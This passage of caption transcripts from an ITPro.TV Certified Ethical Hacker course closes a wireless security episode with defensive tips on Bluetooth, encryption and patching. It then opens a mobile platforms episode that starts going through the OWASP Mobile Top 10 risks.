concepts.\n\n819\n00:36:08.150 --> 00:36:12.630\nDon't talk to strangers, making sure we\nuse non-regular patterns as pin keys,\n\n820\n00:36:12.630 --> 00:36:13.915\nso again randomness.\n\n821\n00:36:13.915 --> 00:36:15.895\nWhere we can find it,\ntrying to stealth things.\n\n822\n00:36:15.895 --> 00:36:19.145\nKeep Bluetooth in disabled state,\nenable it only when you need it.\n\n823\n00:36:19.145 --> 00:36:24.355\nDon't allow for or accept any unknown or\nunexpected requests to associate or bind.\n\n824\n00:36:24.355 --> 00:36:25.535\nI love when I get into people's cars,\n\n825\n00:36:25.535 --> 00:36:27.595\nthey've got Bluetooth enabled\nthe minute the car comes on and\n\n826\n00:36:27.595 --> 00:36:30.090\neverything I own just suddenly lights up.\n\n827\n00:36:30.090 --> 00:36:32.085\n&gt;&gt; [LAUGH]\n&gt;&gt; So I keep it off on my devices.\n\n828\n00:36:32.085 --> 00:36:34.335\nI don't allow it to be used.\n\n829\n00:36:34.335 --> 00:36:37.155\nMaking sure you keep the device in\nnon-discoverable, hidden mode so\n\n830\n00:36:37.155 --> 00:36:38.885\npeople are not associating.\n\n831\n00:36:38.885 --> 00:36:41.180\nKeep kinda randomly check your devices,\n\n832\n00:36:41.180 --> 00:36:44.460\nmaking sure you know what's there,\nalways enable encryption on them,\n\n833\n00:36:44.460 --> 00:36:48.755\nmaking sure that those things are going\nto be as protected as it can be.\n\n834\n00:36:48.755 --> 00:36:49.980\n&gt;&gt; Mm-hm.\n\n835\n00:36:49.980 --> 00:36:51.862\n&gt;&gt; Just important stuff to consider.\n\n836\n00:36:51.862 --> 00:36:54.980\nWe can often think about different\nlayers of wireless security.\n\n837\n00:36:54.980 --> 00:36:59.192\nA lot of times wireless signal\nsecurity using spread spectrum,\n\n838\n00:36:59.192 --> 00:37:02.312\nfrequency hopping, things like that, FHSS,\n\n839\n00:37:02.312 --> 00:37:06.800\nOFDM, DSSS that we talked about or\nDSSS yeah, I got that right.\n\n840\n00:37:06.800 --> 00:37:09.540\nWireless IDSs, wireless IPSs.\n\n841\n00:37:09.540 --> 00:37:11.540\nPeople often forget we have WIPs and WIDs.\n\n842\n00:37:11.540 --> 00:37:13.860\n&gt;&gt; Yes.\n&gt;&gt; Wireless IP, Wireless IDSs.\n\n843\n00:37:13.860 --> 00:37:16.930\nMuch like NIDs and NIPs and HIDs and HIPs.\n\n844\n00:37:16.930 --> 00:37:21.191\nSo data protection, using\nthe appropriate level of protocol and\n\n845\n00:37:21.191 --> 00:37:25.190\nencryption, so\nWPA2 Enterprise with AES would be good.\n\n846\n00:37:25.190 --> 00:37:28.105\nConnection security,\nwhich you centralize encryption,\n\n847\n00:37:28.105 --> 00:37:32.450\npeer-based authentication, or rather,\nper-packet-based authentication,\n\n848\n00:37:32.450 --> 00:37:35.230\nas opposed to just\nallowing open connections.\n\n849\n00:37:35.230 --> 00:37:36.530\nStrong authentication on the network.\n\n850\n00:37:36.530 --> 00:37:37.880\nWe've talked about some of that.\n\n851\n00:37:37.880 --> 00:37:41.500\nVulnerability in patch management,\nassociation on the device level,\n\n852\n00:37:41.500 --> 00:37:43.530\nmaking sure we're up to date.\n\n853\n00:37:43.530 --> 00:37:47.910\nThat's important, especially you have your\nown cell phones, as most of us do today,\n\n854\n00:37:47.910 --> 00:37:51.090\nand you're not using a corporate owned,\ncorporate managed device.\n\n855\n00:37:51.090 --> 00:37:55.420\n&gt;&gt; And you may be responsible for applying\nvendor related patches on your own.\n\n856\n00:37:55.420 --> 00:37:57.900\nThis is something else to consider and\nthink about.\n\n857\n00:37:57.900 --> 00:38:02.850\nIf we're on Verizon, if we're on Sprint,\nif we're on T-Mobile, AT&amp;T, any of\n\n858\n00:38:02.850 --> 00:38:07.095\nthe four kind of biggies, at least in\nthe U.S. and obviously around the world.\n\n859\n00:38:07.095 --> 00:38:10.495\nDeutsche Telekom in Germany and\nwherever you may be,\n\n860\n00:38:10.495 --> 00:38:12.745\nwhatever that local carrier is.\n\n861\n00:38:12.745 --> 00:38:16.475\nWhen you're on those carriers,\nwhether it's Lime or\n\n862\n00:38:16.475 --> 00:38:21.680\nit is one of the big carriers\nin the Caribbean for instance.\n\n863\n00:38:21.680 --> 00:38:27.000\nIf you are using any of the carriers\nanywhere in the world, the point is that\n\n864\n00:38:27.000 --> 00:38:31.180\nwhen you do those things or rather when\nyou're on their systems, I should say.\n\n865\n00:38:31.180 --> 00:38:35.690\nYou, as the customer, are responsible for\nchecking to make sure that you know\n\n866\n00:38:35.690 --> 00:38:37.790\nthat there are patches that\nmay be pending to be applied.\n\n867\n00:38:37.790 --> 00:38:42.740\nThe vendor a lot of times, in other\nwords the cell carrier will push out\n\n868\n00:38:42.740 --> 00:38:47.690\nthe iOS update or whatever the update is\nto the operating system that Bluetooth,\n\n869\n00:38:47.690 --> 00:38:52.370\nor Bluetooth, that Blackberry or\nAndroid or Apple puts out.\n\n870\n00:38:52.370 --> 00:38:55.520\nBut you then have to download it,\naccept it, and apply it, right?\n\n871\n00:38:55.520 --> 00:38:57.840\nSo yeah,\nyou have to make sure you're aware of it.\n\n872\n00:38:57.840 --> 00:39:00.050\nAnd a lot of us don't do it right away.\n\n873\n00:39:00.050 --> 00:39:03.290\nThe last major Apple update that they\ndid screwed up a bunch of stuff when it\n\n874\n00:39:03.290 --> 00:39:05.280\nfirst came out, so everybody said,\nI don't wanna do that.\n\n875\n00:39:05.280 --> 00:39:07.325\nAnd then you waited for a bit.\n\n876\n00:39:07.325 --> 00:39:09.740\nSo you gotta remember that,\n\n877\n00:39:09.740 --> 00:39:14.200\nbecause if you don't patch the device,\nthen that's obviously a problem as well.\n\n878\n00:39:14.200 --> 00:39:17.300\nAnd you have something else we have\nto think about and be aware of.\n\n879\n00:39:17.300 --> 00:39:19.590\nSo there's that, so device security.\n\n880\n00:39:19.590 --> 00:39:23.840\nAnd user protection, we talked about\nthe value of using firewalls at the local\n\n881\n00:39:23.840 --> 00:39:26.630\nendpoints, and you've been a big proponent\nof that as I've talked about it,\n\n882\n00:39:26.630 --> 00:39:28.070\nyou said you think it's a good idea.\n\n883\n00:39:28.070 --> 00:39:29.390\nAnd it's something else to consider,\n\n884\n00:39:29.390 --> 00:39:33.820\nthose overlapping layers of control and\ndefense that we often think about.\n\n885\n00:39:33.820 --> 00:39:36.130\nSo these are the kind of\nthings that we wanna know,\n\n886\n00:39:36.130 --> 00:39:40.430\nchanging the default SSIDs that ship\nout of the box, obviously a good one.\n\n887\n00:39:40.430 --> 00:39:44.220\nDisable remote routing capability and\nfunctionality and wireless access points,\n\n888\n00:39:44.220 --> 00:39:45.680\ndon’t allow people in.\n\n889\n00:39:45.680 --> 00:39:49.550\nMake sure encryption is turned on,\nrouter access passwords should be set,\n\n890\n00:39:49.550 --> 00:39:51.680\nthey should not be defaults,\nthings like that.\n\n891\n00:39:51.680 --> 00:39:54.790\nAny or all of these things are going to\nplay into this conversation, I think.\n\n892\n00:39:54.790 --> 00:39:56.700\nAnd ultimately are going to be good for\n\n893\n00:39:56.700 --> 00:40:00.210\nus to consider as we wrap up and\njust think about the last\n\n894\n00:40:00.210 --> 00:40:03.300\nareas of this conversation to make\nsure we've covered all the highlights.\n\n895\n00:40:03.300 --> 00:40:06.811\n&gt;&gt; All right, a good way to round out\nour discussion on our wireless and\n\n896\n00:40:06.811 --> 00:40:09.530\nwireless security and\nhacking wireless networks.\n\n897\n00:40:09.530 --> 00:40:11.830\nGood look at some of\nthe tools we might use,\n\n898\n00:40:11.830 --> 00:40:15.030\nthat man-in-the-middle technique,\nthe steps that we need to understand about\n\n899\n00:40:15.030 --> 00:40:17.830\nhow some attack like that\nis gonna be carried out.\n\n900\n00:40:17.830 --> 00:40:20.130\nSo we can protect ourselves\nagainst something like that.\n\n901\n00:40:20.130 --> 00:40:21.460\nWe appreciate that, Adam.\n\n902\n00:40:21.460 --> 00:40:23.590\nHope everybody out there\nenjoyed watching this one.\n\n903\n00:40:23.590 --> 00:40:24.650\nSigning off for ITPro.TV.\n\n904\n00:40:24.650 --> 00:40:25.290\nI'm Mike Roderick.\n\n905\n00:40:25.290 --> 00:40:27.070\n&gt;&gt; I'm Adam Gordon.\n\n906\n00:40:27.070 --> 00:40:29.486\n&gt;&gt; And we'll see you next time.\n\n907\n00:40:29.486 --> 00:40:35.410\n[SOUND]\n\n",

00:00:15.580\nat ITPRO.TV.\n\n4\n00:00:15.580 --> 00:00:19.610\nI'm your host Mike Rodrick and today we're\ndoing Certified Ethical Hacker version 9.\n\n5\n00:00:19.610 --> 00:00:23.020\nSpecifically in this episode we're gonna\nbe looking at mobile platforms, right.\n\n6\n00:00:23.020 --> 00:00:27.110\nIt's a ever growing part\nof enterprise network and\n\n7\n00:00:27.110 --> 00:00:30.120\none that brings new challenges when\nit comes to trying to keep those\n\n8\n00:00:30.120 --> 00:00:33.940\ndevices safe, new avenues of attack for\nthe bad actors.\n\n9\n00:00:33.940 --> 00:00:37.020\nAnd here to help us figure all\nthis out is Mr. Adam Gordon.\n\n10\n00:00:37.020 --> 00:00:38.070\nHow you doing Adam?\n\n11\n00:00:38.070 --> 00:00:40.230\n&gt;&gt; I'm good.\nNew avenues for attack for them.\n\n12\n00:00:40.230 --> 00:00:45.660\nWow, you were just reaching deep\ninto the well of verbal foreplay and\n\n13\n00:00:45.660 --> 00:00:48.340\ntrying to give us\ninformation to work with.\n\n14\n00:00:48.340 --> 00:00:52.550\nAlright so we are going to talk as\nMike said about mobile devices,\n\n15\n00:00:52.550 --> 00:00:54.320\nmobile platforms.\n\n16\n00:00:54.320 --> 00:01:01.650\nVery very common today one might even\nsay ebickqidise word of the day.\n\n17\n00:01:01.650 --> 00:01:06.480\nWe haven't done word of the day and\ndone one for a while and\n\n18\n00:01:06.480 --> 00:01:08.920\nyou and I have to talk about\nhurricane pizza and cocoa night.\n\n19\n00:01:08.920 --> 00:01:09.950\nWe haven't talked about those.\n\n20\n00:01:09.950 --> 00:01:10.500\n&gt;&gt; Yeah.\n\n21\n00:01:10.500 --> 00:01:13.162\n&gt;&gt; Remember those money making\nideas we never capitalized on.\n\n22\n00:01:13.162 --> 00:01:14.250\n&gt;&gt; [LAUGH]\n&gt;&gt; So we\n\n23\n00:01:14.250 --> 00:01:15.900\nare gonna start with the word of the day.\n\n24\n00:01:15.900 --> 00:01:18.030\nUbiquitous will be our\nword of the session.\n\n25\n00:01:18.030 --> 00:01:20.770\nOur word of the particular\ndiscussion we're gonna have.\n\n26\n00:01:20.770 --> 00:01:23.220\nSo we're gonna talk about\nmobile platforms a little bit.\n\n27\n00:01:23.220 --> 00:01:26.220\nThe idea here is how do we\ntake on mobile devices.\n\n28\n00:01:26.220 --> 00:01:30.430\nI made reference to in prior episodes\nwhen we're dealing with wireless hacking.\n\n29\n00:01:30.430 --> 00:01:35.240\nThe connection between mobile and wireless\nand in that episode, or group of episodes,\n\n30\n00:01:35.240 --> 00:01:37.990\ncuz we talked about in couple of\nthe different ones we did there.\n\n31\n00:01:37.990 --> 00:01:39.860\nWe made reference to the fact and\n\n32\n00:01:39.860 --> 00:01:43.498\nkind of crossed over a little bit,\nbrought in the cryptography conversation.\n\n33\n00:01:43.498 --> 00:01:47.290\nLot of cross-pollination there, also\ntalked about the fact that today mobile\n\n34\n00:01:47.290 --> 00:01:50.490\ndevices are really a hybrid device, right.\n\n35\n00:01:50.490 --> 00:01:53.820\nWhen you talk mobile devices,\ntablets, handhelds,\n\n36\n00:01:53.820 --> 00:01:57.750\nsmart phones, we're talking about devices\nthat at least in the cell phone sense,\n\n37\n00:01:57.750 --> 00:02:00.320\nthe smart phone sense\nare those radio devices.\n\n38\n00:02:00.320 --> 00:02:03.010\nSo they are using your\ntraditional cell network but\n\n39\n00:02:03.010 --> 00:02:04.720\nthey are also wireless capable.\n\n40\n00:02:04.720 --> 00:02:06.840\nAnd so they operate in both capacities.\n\n41\n00:02:06.840 --> 00:02:10.520\nAnd so when we are hacking mobile\nplatforms and mobile devices.\n\n42\n00:02:10.520 --> 00:02:14.080\nWe think about the common things,\nthe android, the ios.\n\n43\n00:02:14.080 --> 00:02:18.350\nMy favorite, right, the Blackberry,\nthe Windows Mobile.\n\n44\n00:02:18.350 --> 00:02:23.210\nI saw recently that Windows Mobile\ndevices kind of woo,\n\n45\n00:02:23.210 --> 00:02:27.322\non the way down, and\nnot really doing well unfortunately.\n\n46\n00:02:27.322 --> 00:02:30.545\nGreat concept, I mean platform\nwise great idea obviously the form\n\n47\n00:02:30.545 --> 00:02:34.595\nfactors still seem to be very attractive\nto people for a variety of reasons.\n\n48\n00:02:34.595 --> 00:02:38.955\nWe're anticipating obviously\ncontinued domination by Android, and\n\n49\n00:02:38.955 --> 00:02:42.670\nI would guess probably Apple in that\nspace as black berries kind of petering.\n\n50\n00:02:42.670 --> 00:02:44.090\nOut moving towards androids slowly, but\n\n51\n00:02:44.090 --> 00:02:48.190\nsurely and kind of the two that\nare dominate although of the two android\n\n52\n00:02:48.190 --> 00:02:51.690\nseems to be the one that\nis just taking over.\n\n53\n00:02:51.690 --> 00:02:52.670\n&gt;&gt; It just keeps growing and growing.\n\n54\n00:02:52.670 --> 00:02:56.350\n&gt;&gt; I may have mentioned this in one of\nthe episodes earlier that we've been doing\n\n55\n00:02:56.350 --> 00:03:01.027\nthis go around but\n&gt;&gt; I was listening to a BBC interview.\n\n56\n00:03:01.027 --> 00:03:05.117\nI think I did mention this in one of\nthe episodes we did early on, and\n\n57\n00:03:05.117 --> 00:03:09.938\nthe analysts on there were saying that\nthey ship over a billion, with a B, as in\n\n58\n00:03:09.938 --> 00:03:15.320\nMcDonald's servers billions and billions,\nor Carl Sagan, billions and billions.\n\n59\n00:03:15.320 --> 00:03:16.140\n&gt;&gt; [LAUGH]\n&gt;&gt; You remember?\n\n60\n00:03:16.140 --> 00:03:16.920\n&gt;&gt; Yeah, I do.\n\n61\n00:03:16.920 --> 00:03:18.180\n&gt;&gt; In Cosmos.\n\n62\n00:03:18.180 --> 00:03:22.760\nSo a billion, over a billion\ndevices a year with the Android OS.\n\n63\n00:03:22.760 --> 00:03:25.330\nAre being shipped\ncurrently year over year.\n\n64\n00:03:25.330 --> 00:03:29.540\nIt is the most widely deployed operating\nsystem by a factor of, I think\n\n65\n00:03:29.540 --> 00:03:33.370\nthree times, I think they said, against\nMicrosoft when you look at that space.\n\n66\n00:03:33.370 --> 00:03:35.370\nNow, I mean, Microsoft does play, and\n\n67\n00:03:35.370 --> 00:03:39.260\nthe commercial space predominately,\nthe enterprize space.\n\n68\n00:03:39.260 --> 00:03:42.500\nAnd Android is there, but\nnot significantly, certainly.\n\n69\n00:03:42.500 --> 00:03:45.200\nThey're talking primarily about\ncommercial devices in tablets.\n\n70\n00:03:45.200 --> 00:03:47.440\nAnd, while Microsoft\ndoes have a play there,\n\n71\n00:03:47.440 --> 00:03:50.190\nthat's not the primary focus of\nwhere they deploy their os'.\n\n72\n00:03:50.190 --> 00:03:54.490\nSo, when you look at it, apples to apples,\nthey're not the most widely deployed.\n\n73\n00:03:54.490 --> 00:03:58.050\nOn the enterprise side, but the city\ngot stuck with a billion devices a year\n\n74\n00:03:58.050 --> 00:04:00.960\non average are shipping with that or less.\n\n75\n00:04:00.960 --> 00:04:04.140\nAnd the fact that there is\nobviously renewed interest\n\n76\n00:04:04.140 --> 00:04:07.470\non the afterside of now that we\nhave been passively talking about.\n\n77\n00:04:07.470 --> 00:04:10.570\nAnd obviously on the mobile side\nspecifically wanna be thinking about that.\n\n78\n00:04:10.570 --> 00:04:13.160\nIt's kind of interesting as\nwe start this conversation.\n\n79\n00:04:13.160 --> 00:04:18.310\nSo specific to this we wanna start\nout because no good conversation\n\n80\n00:04:18.310 --> 00:04:21.640\nwith regards to mobile hacking\nwould really be complete.\n\n81\n00:04:21.640 --> 00:04:25.180\nWithout a discussion of one of my\nmost favorite websites overall, and\n\n82\n00:04:25.180 --> 00:04:28.530\none of my most favorite areas,\nand organizations to talk about,\n\n83\n00:04:28.530 --> 00:04:31.700\nwhich is OWASP,\nthe Open Web Application Security Project.\n\n84\n00:04:31.700 --> 00:04:37.000\nOWASP mobile top ten risks, they have a\nvariety and a bunch of different top tens.\n\n85\n00:04:37.000 --> 00:04:40.610\nWe talk about them in different\nepisodes across the CEH program and\n\n86\n00:04:40.610 --> 00:04:44.620\nin certain other programs,\nCISSP for instance, SSCP cloud.\n\n87\n00:04:44.620 --> 00:04:45.870\nWe've talked about them there.\n\n88\n00:04:45.870 --> 00:04:48.190\nI know you're putting that\nup in the chat for us.\n\n89\n00:04:48.190 --> 00:04:49.790\nBut if we could go to Mike's machine,\n\n90\n00:04:49.790 --> 00:04:53.080\nI know we have the website\nup to the top ten project.\n\n91\n00:04:53.080 --> 00:04:55.100\nWing to first screen so\nwe could see everything.\n\n92\n00:04:55.100 --> 00:04:58.630\nYou'll see that this is something you\ndefinitely gonna want to take a look at.\n\n93\n00:04:58.630 --> 00:05:00.260\nYou'll wanna spend some time here.\n\n94\n00:05:00.260 --> 00:05:03.250\nWe're gonna through each\none of the top tens but\n\n95\n00:05:03.250 --> 00:05:06.240\nyou would want to spend time\nunderstanding what they are.\n\n96\n00:05:06.240 --> 00:05:09.330\nMike's gonna drive here for\nme and we're gonna navigate and\n\n97\n00:05:09.330 --> 00:05:12.270\nnarrate together, down through the list.\n\n98\n00:05:12.270 --> 00:05:13.800\nUnlike some of the other top tens,\n\n99\n00:05:13.800 --> 00:05:15.950\nyou and I will just talk\nabout this before we came on.\n\n100\n00:05:15.950 --> 00:05:19.165\nThis one is not currently\navailable in a PDF download\n\n101\n00:05:19.165 --> 00:05:22.745\nthe way the web application\nvulnerabilities are for instance, right?\n\n102\n00:05:22.745 --> 00:05:26.635\nAnd this is also done on a rolling\nbasis every three years approximately,\n\n103\n00:05:26.635 --> 00:05:31.615\nalthough they're aggregating the 2015\nstuff now and doing it for 2016.\n\n104\n00:05:31.615 --> 00:05:36.305\nIt's going to be out, I think, late in\nthe year, and they're doing the 2016 for\n\n105\n00:05:36.305 --> 00:05:36.805\nnext year.\n\n106\n00:05:36.805 --> 00:05:40.235\nSo they're trying to keep up with this one\na little bit more frequently, but we're\n\n107\n00:05:40.235 --> 00:05:44.160\nseeing about a year lag to a two year lag\non average anyway, but there is a Top 10.\n\n108\n00:05:44.160 --> 00:05:47.900\nLet's just go through the start\nwith each one just so\n\n109\n00:05:47.900 --> 00:05:49.580\nyou understand the file process here.\n\n110\n00:05:49.580 --> 00:05:52.960\nWe're gonna click through the link and\nthen bring up the individual page.\n\n111\n00:05:52.960 --> 00:05:56.500\nYou just click the preview, we talked\nabout it, and then go through all ten so\n\n112\n00:05:56.500 --> 00:05:57.920\nyou understand what they are.\n\n113\n00:05:57.920 --> 00:05:59.630\nFirst one is weak server side control.\n\n114\n00:05:59.630 --> 00:06:01.230\nSo we'll click there quickly.\n\n115\n00:06:01.230 --> 00:06:03.860\nWe may need to zoom in a little\nbit just so that they can see it.\n\n116\n00:06:03.860 --> 00:06:06.660\nSo that way, I just wanna be able\nto give them a general sense.\n\n117\n00:06:06.660 --> 00:06:09.030\nSo you're gonna see this\nformat in everyone of them.\n\n118\n00:06:09.030 --> 00:06:10.820\nIt'd be good for you to take a look.\n\n119\n00:06:10.820 --> 00:06:15.150\nYou'll see threat agents, so the\napplication specific issue attack vector.\n\n120\n00:06:15.150 --> 00:06:19.730\nThe color coding by the way,\nred there, the exploitability, easy.\n\n121\n00:06:19.730 --> 00:06:23.420\nSo it's obviously very easy to exploit,\nand security weaknesses there.\n\n122\n00:06:23.420 --> 00:06:25.730\nYou know the prevalence is common.\n\n123\n00:06:25.730 --> 00:06:29.685\nRight, detectability average, and\nthen technical impact is severe.\n\n124\n00:06:29.685 --> 00:06:32.455\nSo red for\nwarning danger Will Robinson right,\n\n125\n00:06:32.455 --> 00:06:35.695\nand then business impact\napplication business specific.\n\n126\n00:06:35.695 --> 00:06:38.455\nSo we're just going to focus\nover on the left, and talk for\n\n127\n00:06:38.455 --> 00:06:40.115\na minute about weak server side controls.\n\n128\n00:06:40.115 --> 00:06:44.180\nSO The ID here potentially rather for\ndoing with the mobile platform.\n\n129\n00:06:45.440 --> 00:06:48.740\nWe're worried about the fact that your\nBlackberry friends, since we're using\n\n130\n00:06:48.740 --> 00:06:54.220\nthe best server if we're using\nan Android and or an Apple or even a.\n\n131\n00:06:54.220 --> 00:06:58.410\nA Windows mobile platform, the issue\nhere is what we're connecting up to.\n\n132\n00:06:58.410 --> 00:07:01.370\nSo if we have server\nsite control at a week,\n\n133\n00:07:01.370 --> 00:07:03.570\nif we're not doing proper authentication.\n\n134\n00:07:03.570 --> 00:07:05.880\nIf we're not doing proper management and\n\n135\n00:07:05.880 --> 00:07:10.020\nmaintenance there we can run into\nissues where the app may be vulnerable.\n\n136\n00:07:10.020 --> 00:07:13.840\nWe may have malware that is\ngoing to be pushed right, so\n\n137\n00:07:13.840 --> 00:07:17.740\nwe have all different concerns that\nwe may wanna on, and just be away of.\n\n138\n00:07:17.740 --> 00:07:22.560\nSo if we're not centrally managing\nwith policy, we're not controlling and\n\n139\n00:07:22.560 --> 00:07:25.750\nlocking down with a mobile\ndevice management platform,\n\n140\n00:07:25.750 --> 00:07:28.060\nthen we're going to have issues and\nconcerns, right?\n\n141\n00:07:28.060 --> 00:07:30.040\n&gt;&gt; So\nthat's really what we're addressing here.\n\n142\n00:07:30.040 --> 00:07:31.010\nCan we go number two?\n\n143\n00:07:31.010 --> 00:07:32.180\nYou can just kill that one if you want.\n\n144\n00:07:32.180 --> 00:07:36.980\nGo back, and so number two, we'll click\non, it's gonna be insecure data storage.\n\n145\n00:07:36.980 --> 00:07:40.920\nSo again, the idea here, we'll just have\nthe general form up so you can see it.\n\n146\n00:07:40.920 --> 00:07:42.941\nBut insecure data storage yeah,\n\n147\n00:07:42.941 --> 00:07:46.413\nwe're worried here about\nthe fact that we may be able to.\n\n148\n00:07:46.413 --> 00:07:50.573\nEither because we're not encrypting\ninformation in storage, or we are not\n\n149\n00:07:50.573 --> 00:07:55.391\ntaking proper protections with removable\nstorage, SD cards, for instance, right?\n\n150\n00:07:55.391 --> 00:07:58.343\nBe very prevalent in the mobile platform\nif we're talking about phones in\n\n151\n00:07:58.343 --> 00:07:59.874\nparticular, not so much on tablets.\n\n152\n00:07:59.874 --> 00:08:03.338\nIs for more on phones and\nhandhelds,wanna worry about that.\n\n153\n00:08:03.338 --> 00:08:07.681\nAlso wanna worry about on board\nstorage versus removable storage.\n\n154\n00:08:07.681 --> 00:08:11.000\nSo for instance in some MDM platforms\nwe have the ability to be able to\n\n155\n00:08:11.000 --> 00:08:15.270\ndifferentiate between both,encrypt both,\nmanage both,create the public private\n\n156\n00:08:15.270 --> 00:08:19.668\npersona, where we have the corporate data\nin partition private data in the other.\n\n157\n00:08:19.668 --> 00:08:21.600\nWe could selectively remote wipe.\n\n158\n00:08:21.600 --> 00:08:24.770\nIf we're not segmenting the data and\nthe storage that way.\n\n159\n00:08:24.770 --> 00:08:27.240\nThat can lead to complications and\nconcerns.\n\n160\n00:08:27.240 --> 00:08:31.130\nAlso somebody could literally just come\nalong pop that sd card out of the phone if\n\n161\n00:08:31.130 --> 00:08:35.420\nwe leave it laying around, and if the\ndata's not encrypted they've walked away\n\n162\n00:08:35.420 --> 00:08:38.670\nand plug it in somewhere and\nwe're done right.\n\n163\n00:08:38.670 --> 00:08:41.130\nAnd alot of times we\ndon't think about that\n\n164\n00:08:41.130 --> 00:08:44.550\nwith the native storage in most\nof these systems is onboard.\n\n165\n00:08:44.550 --> 00:08:49.310\nYou have to choose to store to\nan external or a SD card that's added,\n\n166\n00:08:49.310 --> 00:08:52.570\nbecause the default behavior is\nstore on board, which is fine.\n\n167\n00:08:52.570 --> 00:08:54.290\nSomething like an Apple device,\nyou don't have a choice.\n\n168\n00:08:54.290 --> 00:08:58.160\nThere is no extensible add\nin kind of add-on storage,\n\n169\n00:08:58.160 --> 00:09:00.740\nat least not directly in the device.\n\n170\n00:09:00.740 --> 00:09:03.800\nYou could theoretically,\nobviously, plug the device in and\n\n171\n00:09:03.800 --> 00:09:07.262\nuse the machine you sync to\nto store stuff and dump it.\n\n172\n00:09:07.262 --> 00:09:10.683\n[CROSSTALK] But there's no onboard\nexternal SD card storage capability.\n\n173\n00:09:10.683 --> 00:09:14.780\nSo from that perspective, as much as it\npains me to say that, Apple actually is\n\n174\n00:09:14.780 --> 00:09:19.313\na little bit more secure in this one area,\nbecause Blackberry, and Android devices,\n\n175\n00:09:19.313 --> 00:09:23.740\nand Windows mobile devices, depending\non the form fact and the manufacturer.\n\n176\n00:09:23.740 --> 00:09:26.130\nBut the majority of them do support\n\n177\n00:09:26.130 --> 00:09:28.630\nthird party external SD cards\nyou can plug in and use.\n\n178\n00:09:28.630 --> 00:09:32.270\nSo wanna be aware of that using the\nstrongest level of encryption possible.\n\n179\n00:09:32.270 --> 00:09:35.680\nTo safeguard that storage,\nit's gonna be very good and helpful.\n\n180\n00:09:35.680 --> 00:09:38.820\nOr you could use the old\nlet's just pour epoxy or\n\n181\n00:09:38.820 --> 00:09:39.764\nGorilla Glue-\n&gt;&gt; Yeah, right.\n\n182\n00:09:39.764 --> 00:09:41.320\n[LAUGH]\n&gt;&gt; Into the storage port and\n\n183\n00:09:41.320 --> 00:09:42.490\nthat'll take care of that as well.\n\n184\n00:09:42.490 --> 00:09:43.230\n&gt;&gt; That solves that one.\n\n185\n00:09:43.230 --> 00:09:44.190\n&gt;&gt; That does solve that one,\n\n186\n00:09:44.190 --> 00:09:45.144\nI think I've told you a story about-\n&gt;&gt; Yeah.\n\n187\n00:09:45.144 --> 00:09:46.126\n[CROSSTALK]\n&gt;&gt; Being on base and\n\n188\n00:09:46.126 --> 00:09:47.840\nhow they deal with that\n&gt;&gt; Or\n\n189\n00:09:47.840 --> 00:09:50.160\nhow they have dealt with that while\nI've been standing and watching.\n\n190\n00:09:50.160 --> 00:09:52.990\nSo number three, insufficient,\nlet's go to the next one.\n\n191\n00:09:52.990 --> 00:09:56.070\nInsufficient Transport Layer Protection,\nif you're all ready there, I apologize,\n\n192\n00:09:56.070 --> 00:09:56.780\nI wasn't paying attention.\n\n193\n00:09:56.780 --> 00:09:59.220\nSo again here what are we thinking about?\n\n194\n00:09:59.220 --> 00:10:02.590\nHow are we managing data going back and\n\n195\n00:10:02.590 --> 00:10:05.370\nforth transport layer as if\nyour the OSI model, right?\n\n196\n00:10:05.370 --> 00:10:08.880\nSo making sure we know\n&gt;&gt; That we are talking about.\n\n197\n00:10:08.880 --> 00:10:12.550\nHow we're going to deal\nwith the examination and\n\n198\n00:10:12.550 --> 00:10:14.710\nthe movement of data back and forth.\n\n199\n00:10:14.710 --> 00:10:15.890\nThe sort answer here,\n\n200\n00:10:15.890 --> 00:10:18.540\nout of the gate no matter what\nwe're talking is encryption, right.\n\n201\n00:10:18.540 --> 00:10:20.100\n&gt;&gt; Right.\n&gt;&gt; Whether we're tunneling and\n\n202\n00:10:20.100 --> 00:10:21.260\nencrypting\n&gt;&gt; Hopefully,\n\n203\n00:10:21.260 --> 00:10:24.450\nnot tunneling without encryption,\nbut you're tunneling and encrypting.\n\n204\n00:10:24.450 --> 00:10:27.350\nHowever, when doing that, we need to\nuse secure protocols and encrypt.\n\n205\n00:10:27.350 --> 00:10:29.630\nThat's gonna be the counter\nmeasure we want to implement,\n\n206\n00:10:29.630 --> 00:10:31.757\nand controls we wanna implement.\n\n207\n00:10:31.757 --> 00:10:33.039\nSo let's go to number four.\n\n208\n00:10:33.039 --> 00:10:35.790\nThis should be an intended data leakage.\n\n209\n00:10:35.790 --> 00:10:36.630\nAll right?\nSounds like\n\n210\n00:10:36.630 --> 00:10:37.865\na personal problem of some kind.\n\n211\n00:10:37.865 --> 00:10:39.190\n&gt;&gt; [LAUGH]\n&gt;&gt; Or something you may see\n\n212\n00:10:39.190 --> 00:10:41.180\na doctor about,\ndepending on what's going on.\n\n213\n00:10:41.180 --> 00:10:45.070\nSo I've heard that after bluesmacking and\nbluesnarfing and bluejacking that that can\n\n214\n00:10:45.070 --> 00:10:45.874\nhappen [INAUDIBLE]-\n&gt;&gt; That it\n\n215\n00:10:45.874 --> 00:10:46.616\nleads to unintended data leakage?\n\n216\n00:10:46.616 --> 00:10:47.150\n&gt;&gt; Data leakage.\n[LAUGH]\n\n217\n00:10:47.150 --> 00:10:48.350\n&gt;&gt; Yeah, unintended data leakage can be\n\n218\n00:10:48.350 --> 00:10:50.800\na direct result of loose packing.\n\n219\n00:10:50.800 --> 00:10:52.000\nThat can actually happen.\n\n220\n00:10:52.000 --> 00:10:53.660\nSo, you wanna watch that.\n\n221\n00:10:53.660 --> 00:10:55.000\nYou gotta be very careful with that.\n\n222\n00:10:55.000 --> 00:10:57.040\nHe didn't laugh at that, but\nhe did at the other stuff.\n\n223\n00:10:57.040 --> 00:10:59.840\nI think he's just totally not\npaying attention to me anymore.\n\n224\n00:10:59.840 --> 00:11:03.420\nSo, unintended data leakage is\nalso gonna be a big problem.\n\n225\n00:11:03.420 --> 00:11:08.170\nAre we either seeing covert channels\nthat potentially would allow for\n\n226\n00:11:08.170 --> 00:11:11.000\nsomebody to be able to see data and\npull it out?\n\n227\n00:11:11.000 --> 00:11:13.620\nReference item number two\nin secure data storage and\n\n228\n00:11:13.620 --> 00:11:16.670\nitem three in sufficient\ntransport layer protection there.\n\n229\n00:11:16.670 --> 00:11:20.380\nBut are we having perhaps to\ntalk to time of channel or\n\n230\n00:11:20.380 --> 00:11:22.720\ncheck time of use attack potential?\n\n231\n00:11:22.720 --> 00:11:25.970\nDo we have unintended consequences\nwhere people can see things,\n\n232\n00:11:25.970 --> 00:11:29.590\nbecause we don't allow them to or\nwant them to normally but 